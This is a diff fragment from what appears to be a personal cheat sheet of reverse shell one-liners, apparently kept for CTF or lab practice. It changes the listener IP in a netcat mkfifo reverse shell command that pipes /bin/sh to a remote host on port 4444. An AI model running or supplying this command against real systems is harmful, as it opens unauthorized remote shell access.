@@ -44,7 +44,7 @@ Python (almost always works in my experience):
 
 Netcat when you dont have the -e option (this actually worked once when the others didnt!):
 
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.178.75 4444 >/tmp/f`
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.181.111 4444 >/tmp/f`
 
 Node reverse shell, if you can get this included on a nodejs server:
 
